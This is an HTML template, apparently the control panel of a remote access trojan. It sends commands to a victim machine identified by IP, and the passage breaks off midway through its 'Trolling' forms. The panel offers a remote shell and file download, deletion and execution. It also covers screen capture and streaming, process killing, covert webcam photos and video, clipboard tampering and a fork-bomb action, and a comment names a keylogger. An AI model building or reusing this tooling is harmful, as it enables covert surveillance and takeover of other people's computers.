<div class="space-y-6">
    <!-- Remote Shell Section -->
    <div class="glass-effect rounded-xl p-6 shadow-lg">
        <div class="flex items-center gap-3 mb-4">
            <div
                class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
            >
                <svg
                    class="w-4 h-4 text-gray-300"
                    fill="none"
                    stroke="currentColor"
                    viewBox="0 0 24 24"
                >
                    <path
                        stroke-linecap="round"
                        stroke-linejoin="round"
                        stroke-width="2"
                        d="M8 9l3 3-3 3m5 0h3"
                    ></path>
                </svg>
            </div>
            <h3 class="text-xl font-semibold text-white">Remote Shell (RSH)</h3>
        </div>
        <form
            hx-post="/api/command/{{ ip }}"
            hx-target="#command-output-{{ ip }}"
            class="space-y-4"
        >
            <input type="hidden" name="module" value="RSH" />
            <div class="flex flex-col md:flex-row gap-3">
                <input
                    type="text"
                    name="args.command"
                    placeholder="Enter command (e.g., whoami, dir, systeminfo)"
                    class="flex-grow px-4 py-3 bg-rgb(24,24,24) border border-gray-600/30 rounded-xl text-white placeholder-gray-500 focus:border-gray-400 focus:ring-2 focus:ring-gray-400/20 transition-all"
                />
                <select
                    name="args.shell"
                    class="px-4 py-3 bg-rgb(24,24,24) border border-gray-600/30 rounded-xl text-white focus:border-gray-400 focus:ring-2 focus:ring-gray-400/20 transition-all"
                >
                    <option value="default">Default Shell</option>
                    <option value="cmd">Command Prompt</option>
                    <option value="powershell">PowerShell</option>
                    <option value="bash">Bash</option>
                    <option value="sh">Shell</option>
                </select>
                <button
                    type="submit"
                    class="bg-white hover:bg-gray-100 text-black font-medium px-6 py-3 rounded-xl transition-all duration-200 flex items-center gap-2"
                >
                    <svg
                        class="w-4 h-4"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M12 19l9 2-9-18-9 18 9-2zm0 0v-8"
                        ></path>
                    </svg>
                    Execute
                </button>
            </div>
        </form>
    </div>

    <!-- File System and Controls Row -->
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <!-- File System Section -->
        <div class="glass-effect rounded-xl p-6 shadow-lg">
            <div class="flex items-center gap-3 mb-4">
                <div
                    class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
                >
                    <svg
                        class="w-4 h-4 text-gray-300"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M3 7v10a2 2 0 002 2h14a2 2 0 002-2V9a2 2 0 00-2-2H5a2 2 0 00-2 2z"
                        ></path>
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M8 5a2 2 0 012-2h2a2 2 0 012 2v0a2 2 0 002 2h2a2 2 0 012 2v4a2 2 0 01-2 2H5a2 2 0 01-2-2V9a2 2 0 012-2h2a2 2 0 002-2V5z"
                        ></path>
                    </svg>
                </div>
                <h3 class="text-xl font-semibold text-white">
                    File System (FS)
                </h3>
            </div>
            <div class="space-y-4">
                <!-- Browse Files -->
                <form
                    hx-post="/api/command/{{ ip }}"
                    hx-target="#command-output-{{ ip }}"
                >
                    <input type="hidden" name="module" value="FS" />
                    <input type="hidden" name="args.operation" value="GET" />
                    <div class="flex gap-2">
                        <input
                            type="text"
                            name="args.path"
                            placeholder="Path (e.g., C:\, D:\Users\)"
                            class="flex-grow px-4 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all"
                        />
                        <button
                            type="submit"
                            class="bg-gray-600 hover:bg-gray-500 text-white px-4 py-2 rounded-lg transition-all duration-200 flex items-center gap-2"
                        >
                            <svg
                                class="w-4 h-4"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                            >
                                <path
                                    stroke-linecap="round"
                                    stroke-linejoin="round"
                                    stroke-width="2"
                                    d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z"
                                ></path>
                            </svg>
                            Browse
                        </button>
                    </div>
                </form>

                <!-- Move/Rename -->
                <form
                    hx-post="/api/command/{{ ip }}"
                    hx-target="#command-output-{{ ip }}"
                >
                    <input type="hidden" name="module" value="FS" />
                    <input type="hidden" name="args.operation" value="MOV" />
                    <div class="grid grid-cols-2 gap-2">
                        <input
                            type="text"
                            name="args.path"
                            placeholder="Source path"
                            class="px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm focus:border-gray-400 transition-all"
                        />
                        <input
                            type="text"
                            name="args.to"
                            placeholder="Destination"
                            class="px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm focus:border-gray-400 transition-all"
                        />
                    </div>
                    <button
                        type="submit"
                        class="w-full mt-2 bg-gray-700 hover:bg-gray-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                    >
                        Move/Rename
                    </button>
                </form>

                <!-- File Operations -->
                <form
                    hx-post="/api/command/{{ ip }}"
                    hx-target="#command-output-{{ ip }}"
                >
                    <input type="hidden" name="module" value="FS" />
                    <input
                        type="text"
                        name="args.path"
                        placeholder="File/folder path for operations below"
                        class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm focus:border-gray-400 transition-all mb-3"
                    />
                    <div class="grid grid-cols-3 gap-2">
                        <button
                            type="submit"
                            hx-vals='{"args.operation": "DOWN"}'
                            class="bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                        >
                            Download
                        </button>
                        <button
                            type="submit"
                            hx-vals='{"args.operation": "DEL"}'
                            class="bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                        >
                            Delete
                        </button>
                        <button
                            type="submit"
                            hx-vals='{"args.operation": "RUN"}'
                            class="bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                        >
                            Execute
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <!-- Right Column: Remote Screen & Task Manager -->
        <div class="space-y-6">
            <!-- Remote Screen Section -->
            <div class="glass-effect rounded-xl p-6 shadow-lg">
                <div class="flex items-center gap-3 mb-4">
                    <div
                        class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
                    >
                        <svg
                            class="w-4 h-4 text-gray-300"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                        >
                            <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z"
                            ></path>
                        </svg>
                    </div>
                    <h3 class="text-lg font-semibold text-white">
                        Remote Screen (RS)
                    </h3>
                </div>
                <div class="space-y-3">
                    <form
                        hx-post="/api/command/{{ ip }}"
                        hx-target="#command-output-{{ ip }}"
                    >
                        <input type="hidden" name="module" value="RS" />
                        <input
                            type="hidden"
                            name="args.action"
                            value="screenshot"
                        />
                        <button
                            type="submit"
                            class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
                        >
                            <svg
                                class="w-4 h-4"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                            >
                                <path
                                    stroke-linecap="round"
                                    stroke-linejoin="round"
                                    stroke-width="2"
                                    d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z"
                                ></path>
                                <path
                                    stroke-linecap="round"
                                    stroke-linejoin="round"
                                    stroke-width="2"
                                    d="M15 13a3 3 0 11-6 0 3 3 0 016 0z"
                                ></path>
                            </svg>
                            Take Screenshot
                        </button>
                    </form>
                    <div class="grid grid-cols-2 gap-2">
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input type="hidden" name="module" value="RS" />
                            <input
                                type="hidden"
                                name="args.action"
                                value="stream_start"
                            />
                            <input
                                type="number"
                                name="args.fps"
                                value="15"
                                class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white text-center mb-2"
                                placeholder="FPS"
                            />
                            <button
                                type="submit"
                                class="w-full bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                            >
                                Start Stream
                            </button>
                        </form>
                        <div class="flex items-end">
                            <form
                                hx-post="/api/command/{{ ip }}"
                                hx-target="#command-output-{{ ip }}"
                                class="w-full"
                            >
                                <input type="hidden" name="module" value="RS" />
                                <input
                                    type="hidden"
                                    name="args.action"
                                    value="stream_stop"
                                />
                                <button
                                    type="submit"
                                    class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                                    style="height: 40px; margin-top: 36px"
                                >
                                    Stop Stream
                                </button>
                            </form>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Task Manager Section -->
            <div class="glass-effect rounded-xl p-6 shadow-lg">
                <div class="flex items-center gap-3 mb-4">
                    <div
                        class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
                    >
                        <svg
                            class="w-4 h-4 text-gray-300"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                        >
                            <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z"
                            ></path>
                        </svg>
                    </div>
                    <h3 class="text-lg font-semibold text-white">
                        Task Manager (TM)
                    </h3>
                </div>
                <div class="space-y-3">
                    <form
                        hx-post="/api/command/{{ ip }}"
                        hx-target="#command-output-{{ ip }}"
                    >
                        <input type="hidden" name="module" value="TM" />
                        <input type="hidden" name="args.action" value="list" />
                        <button
                            type="submit"
                            class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 flex items-center justify-center gap-2"
                        >
                            <svg
                                class="w-4 h-4"
                                fill="none"
                                stroke="currentColor"
                                viewBox="0 0 24 24"
                            >
                                <path
                                    stroke-linecap="round"
                                    stroke-linejoin="round"
                                    stroke-width="2"
                                    d="M4 6h16M4 10h16M4 14h16M4 18h16"
                                ></path>
                            </svg>
                            List Processes
                        </button>
                    </form>
                    <form
                        hx-post="/api/command/{{ ip }}"
                        hx-target="#command-output-{{ ip }}"
                        class="flex gap-2"
                    >
                        <input type="hidden" name="module" value="TM" />
                        <input type="hidden" name="args.action" value="kill" />
                        <input
                            type="number"
                            name="args.pid"
                            placeholder="Process ID"
                            class="flex-grow px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 focus:border-gray-400 transition-all"
                        />
                        <button
                            type="submit"
                            class="bg-red-600/80 hover:bg-red-600 text-white px-4 py-2 rounded-lg transition-all duration-200"
                        >
                            Kill
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <!-- Bottom Row: Webcam, Trolling, Keylogger, Chat -->
    <div class="grid grid-cols-1 lg:grid-cols-2 gap-6">
        <!-- Webcam Section -->
        <div
            class="glass-effect rounded-xl p-6 shadow-lg"
            id="webcam-section-{{ ip }}"
        >
            <div class="flex items-center justify-between mb-4">
                <div class="flex items-center gap-3">
                    <div
                        class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
                    >
                        <svg
                            class="w-4 h-4 text-gray-300"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                        >
                            <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"
                            ></path>
                        </svg>
                    </div>
                    <h3 class="text-xl font-semibold text-white">
                        Webcam (WC)
                    </h3>
                </div>
                <button
                    onclick="hideWebcam('{{ ip }}')"
                    class="bg-gray-700/50 hover:bg-gray-600 text-gray-400 hover:text-white p-2 rounded-lg transition-all duration-200"
                    title="Hide webcam"
                >
                    <svg
                        class="w-4 h-4"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M6 18L18 6M6 6l12 12"
                        ></path>
                    </svg>
                </button>
            </div>

            <div
                class="bg-rgb(16,16,16) rounded-xl mb-4 p-2 flex justify-center items-center min-h-[240px] border border-gray-700/30 relative"
            >
                <canvas
                    id="webcam-canvas-{{ ip }}"
                    height="480"
                    class="max-w-full max-h-full rounded bg-gray-800/50"
                ></canvas>
                <button
                    onclick="openFullscreenWebcam('{{ ip }}')"
                    class="absolute top-3 right-3 bg-black/50 hover:bg-black/70 text-white p-2 rounded-lg transition-all duration-200"
                    title="Open fullscreen"
                >
                    <svg
                        class="w-4 h-4"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="2"
                            d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"
                        ></path>
                    </svg>
                </button>
            </div>

            <div class="grid grid-cols-3 gap-2">
                <form hx-post="/api/command/{{ ip }}" hx-swap="none">
                    <input type="hidden" name="module" value="WC" />
                    <input type="hidden" name="args.mode" value="photo" />
                    <input type="hidden" name="args.compressing" value="true" />
                    <button
                        type="submit"
                        class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                    >
                        Photo
                    </button>
                </form>
                <form hx-post="/api/command/{{ ip }}" hx-swap="none">
                    <input type="hidden" name="module" value="WC" />
                    <input type="hidden" name="args.mode" value="video_start" />
                    <button
                        type="submit"
                        class="w-full bg-green-600/80 hover:bg-green-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                    >
                        Start Video
                    </button>
                </form>
                <form hx-post="/api/command/{{ ip }}" hx-swap="none">
                    <input type="hidden" name="module" value="WC" />
                    <input type="hidden" name="args.mode" value="video_stop" />
                    <button
                        type="submit"
                        class="w-full bg-red-600/80 hover:bg-red-600 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                    >
                        Stop Video
                    </button>
                </form>
            </div>
        </div>

        <!-- Hidden Webcam Placeholder -->
        <div
            class="glass-effect rounded-xl p-6 shadow-lg hidden"
            id="webcam-placeholder-{{ ip }}"
        >
            <div class="flex items-center justify-center h-full min-h-[400px]">
                <div class="text-center">
                    <svg
                        class="w-16 h-16 mx-auto mb-4 text-gray-600"
                        fill="none"
                        stroke="currentColor"
                        viewBox="0 0 24 24"
                    >
                        <path
                            stroke-linecap="round"
                            stroke-linejoin="round"
                            stroke-width="1"
                            d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"
                        ></path>
                    </svg>
                    <h3 class="text-xl font-semibold text-gray-300 mb-2">
                        Webcam Hidden
                    </h3>
                    <p class="text-gray-500 mb-4">
                        Click below to show webcam controls
                    </p>
                    <button
                        onclick="showWebcam('{{ ip }}')"
                        class="bg-white hover:bg-gray-100 text-black px-4 py-2 rounded-lg transition-all duration-200"
                    >
                        Show Webcam
                    </button>
                </div>
            </div>
        </div>

        <!-- Right Column: Trolling, Keylogger, Chat -->
        <div class="space-y-6">
            <!-- Trolling Section -->
            <div class="glass-effect rounded-xl p-6 shadow-lg">
                <div class="flex items-center gap-3 mb-4">
                    <div
                        class="w-8 h-8 bg-gray-700/30 rounded-lg flex items-center justify-center"
                    >
                        <svg
                            class="w-4 h-4 text-gray-300"
                            fill="none"
                            stroke="currentColor"
                            viewBox="0 0 24 24"
                        >
                            <path
                                stroke-linecap="round"
                                stroke-linejoin="round"
                                stroke-width="2"
                                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
                            ></path>
                        </svg>
                    </div>
                    <h3 class="text-lg font-semibold text-white">
                        Trolling (TRL)
                    </h3>
                </div>
                <div class="grid grid-cols-2 gap-3">
                    <form
                        hx-post="/api/command/{{ ip }}"
                        hx-target="#command-output-{{ ip }}"
                    >
                        <input type="hidden" name="module" value="TRL" />
                        <input
                            type="hidden"
                            name="args.action"
                            value="message_box"
                        />
                        <input
                            type="text"
                            name="args.title"
                            placeholder="Title"
                            class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm mb-2"
                        />
                        <textarea
                            name="args.text"
                            placeholder="Message"
                            class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm mb-2"
                            rows="2"
                        ></textarea>
                        <button
                            type="submit"
                            class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                        >
                            Show Message
                        </button>
                    </form>
                    <div class="space-y-2">
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input type="hidden" name="module" value="TRL" />
                            <input
                                type="hidden"
                                name="args.action"
                                value="open_link"
                            />
                            <input
                                type="url"
                                name="args.url"
                                placeholder="https://example.com"
                                class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm mb-2"
                            />
                            <button
                                type="submit"
                                class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                            >
                                Open Link
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input type="hidden" name="module" value="TRL" />
                            <input
                                type="hidden"
                                name="args.action"
                                value="set_clipboard"
                            />
                            <input
                                type="text"
                                name="args.text"
                                placeholder="Clipboard text"
                                class="w-full px-3 py-2 bg-rgb(24,24,24) border border-gray-600/30 rounded-lg text-white placeholder-gray-500 text-sm mb-2"
                            />
                            <button
                                type="submit"
                                class="w-full bg-gray-600 hover:bg-gray-500 text-white py-2 rounded-lg transition-all duration-200 text-sm"
                            >
                                Set Clipboard
                            </button>
                        </form>
                        <form
                            hx-post="/api/command/{{ ip }}"
                            hx-target="#command-output-{{ ip }}"
                        >
                            <input type="hidden" name="module" value="TRL" />
                            <input
                                type="hidden"
                                name="args.action"
                                value="fork_bomb"
                            />
